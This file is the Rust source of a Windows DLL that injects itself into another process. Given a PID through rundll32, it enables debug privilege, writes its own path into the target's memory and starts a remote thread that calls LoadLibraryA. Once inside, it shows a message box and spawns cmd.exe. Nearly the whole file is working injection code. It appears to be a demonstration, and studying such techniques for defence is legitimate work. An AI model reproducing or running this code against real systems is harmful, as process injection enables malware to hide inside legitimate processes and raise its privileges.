#![cfg(windows)]

extern crate winapi;

use std::ffi::{CStr,CString};

use std::ptr::null_mut;

use winapi::shared::{minwindef::*,
                     windef::*};

use winapi::um::{errhandlingapi::*,
                 libloaderapi::*,
                 processthreadsapi::*,
                 winbase::*,
                 winuser::*,
                 winnt::{*,INT},
                 memoryapi::*,
                 securitybaseapi::*};

/// Show error-themed message box
fn error_msg(s: &str) {
    let msg = CString::new(s).unwrap();
    unsafe {
        MessageBoxA(
            null_mut(),
            msg.as_ptr(),
            DLL_NAME.as_ref().unwrap().as_ptr(),
            MB_ICONERROR | MB_OK
        );
    }
}

/// Show info-themed message box
fn info_msg(s: &str) {
    let msg = CString::new(s).unwrap();
    unsafe {
        MessageBoxA(
            null_mut(),
            msg.as_ptr(),
            DLL_NAME.as_ref().unwrap().as_ptr(),
            MB_ICONINFORMATION | MB_OK
        );
    }
}

/// Set SE_DEBUG privilege for current process
fn get_sedebug_priv() -> Result<(),Box<dyn std::error::Error>> {
    let mut token: HANDLE = null_mut();
    let mut privs = TOKEN_PRIVILEGES::default();
    if unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token) } == FALSE {
        return Err(get_last_error_string().into());
    }
    let se_debug_name = CString::new(SE_DEBUG_NAME).unwrap();
    privs.PrivilegeCount = 1;
    if unsafe { LookupPrivilegeValueA(
        null_mut(),
        se_debug_name.as_ptr(),
        &mut (privs.Privileges[0].Luid)
    ) } == FALSE {
        return Err(get_last_error_string().into());
    }
    if unsafe {
        AdjustTokenPrivileges(
            token, FALSE, &mut privs, 0, null_mut(), null_mut())
    } == FALSE {
        return Err(get_last_error_string().into());
    }

    Ok(())
}

/// idiomatic wrapper around OpenProcess
fn open_process(pid: u32) -> Result<HANDLE,Box<dyn std::error::Error>> {
    let h = unsafe {
        OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            pid as DWORD
        )
    };
    if h != null_mut() {
        Ok(h)
    } else {
        Err(get_last_error_string().into())
    }
}

/// Produce formatted message based on GetLastError
fn get_last_error_string() -> String {
    let r = unsafe { GetLastError() };
    let mut msg = [0 as CHAR; 256];
    unsafe {
        FormatMessageA(
            FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            null_mut(),
            r,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT).into(),
            msg.as_mut_ptr(),
            256,
            null_mut())
    };
    unsafe { CStr::from_ptr(msg.as_ptr()) }.to_string_lossy().to_string()
}

/// Resolve address of proc in module.
fn resolve_addr(module: &str, proc: &str) -> Result<FARPROC,Box<dyn std::error::Error>> {
    let module = CString::new(module)?;
    let proc = CString::new(proc)?;
    let h = unsafe { LoadLibraryA(module.as_ptr()) };
    if h == null_mut() {
        return Err(get_last_error_string().into());
    }
    let addr = unsafe { GetProcAddress(h, proc.as_ptr()) };
    if addr == null_mut() {
        return Err(get_last_error_string().into());
    }
    Ok(addr)
}

/// This function is called when the DLL is loaded by rundll32.
///
/// It obtains debug privileges, opens the target process, writes the
/// DLL path to the target process, and spawns a remote thread that
/// calls LoadLibrary(DLL_NAME).
fn do_inject(params: Vec<&str>) -> Result<(),Box<dyn std::error::Error>> {
    if params.len() != 1 {
        return Err("usage: <pid>".into());
    }
    let ll_addr = resolve_addr("kernel32.dll", "LoadLibraryA")?;
    let pid: u32 = params[0].parse().map_err(|e|format!("parse pid: {}", e))?;
    get_sedebug_priv().map_err(|e|format!("AdjustPrivileges: {}", e))?;
    let proc_handle = open_process(pid).map_err(|e|format!("OpenProcess: {}: {}", pid, e))?;
    let dllname_remote_addr = unsafe {
        VirtualAllocEx(proc_handle, null_mut(), MAX_PATH, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE)
    };
    unsafe {
        WriteProcessMemory(proc_handle,
                           dllname_remote_addr,
                           DLL_NAME.as_ref().unwrap().as_ptr() as *const VOID,
                           MAX_PATH,
                           null_mut())
    };
    
    /* FIXME: This may be more fugly than it needs to be. */
    let ll_addr_fnptr = 
        (&(ll_addr as *const fn())
         as *const *const fn())
        as *const extern "system" fn(*mut VOID) -> DWORD;

    let _thread_handle = unsafe {
        CreateRemoteThread(proc_handle,
                           null_mut(),
                           0,
                           Some(*ll_addr_fnptr),
                           dllname_remote_addr as *mut VOID,
                           0,
                           null_mut())
    };

    // Cleanup
    unsafe {
        VirtualFreeEx(proc_handle, dllname_remote_addr, MAX_PATH, MEM_DECOMMIT|MEM_RELEASE)
    };
    
    Ok(())
}

// This function gets called by DllMain if a process other than
// rundll32 has loaded htis DLL.
//
// At this point we can pretty much do anything, for example create
// long-running threads.
//
// Let's just tell the user that everything went well and provide him
// with a cmd.exe.
fn inject_main() {
    info_msg("injection completed");

    let mut si = STARTUPINFOA::default();
    let mut pi = PROCESS_INFORMATION::default();
    unsafe {
        CreateProcessA(null_mut(),
                       CString::new("cmd").unwrap().into_raw(),
                       null_mut(),
                       null_mut(),
                       FALSE,
                       0,
                       null_mut(),
                       null_mut(),
                       &mut si,
                       &mut pi
        )
    };
}

static mut DLL_NAME: Option<Vec<CHAR>> = None;

/* public interface below */

#[no_mangle]
pub extern fn inject(_hwnd: HWND, _hinst: HINSTANCE, cmdline: LPCSTR, _cmdshow: INT) {
    let cmdline = unsafe { CStr::from_ptr(cmdline) }.to_string_lossy();
    let params = cmdline.split(' ').filter(|&s| s != "").collect::<Vec<_>>();

    match do_inject(params) {
        Ok(_) => {},
        Err(s) => error_msg(&s.to_string()),
    };
}

#[no_mangle]
pub extern fn DllMain(hdll: HINSTANCE, fdw_reason: DWORD, _reserved: LPVOID) -> BOOL {
    match fdw_reason {
        DLL_PROCESS_ATTACH => {
            let mut v = Vec::with_capacity(MAX_PATH);
            let len = unsafe { GetModuleFileNameA( hdll, v.as_mut_ptr(), MAX_PATH as _) };
            unsafe { v.set_len(len as usize) };
            unsafe { DLL_NAME = Some(v) };

            let mut buf = [0 as CHAR; MAX_PATH as _];
            unsafe { GetModuleFileNameA( null_mut(), buf.as_mut_ptr(), MAX_PATH as _) };
            let progname = unsafe { CStr::from_ptr(buf.as_ptr()) }.to_string_lossy();
            if !progname.to_lowercase().contains("rundll32") {
                inject_main();
            }
        },
        DLL_THREAD_ATTACH => {
        }
        DLL_THREAD_DETACH => {
        },
        DLL_PROCESS_DETACH => {
        },
        _ => {},
    };
    TRUE
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);
    }
}
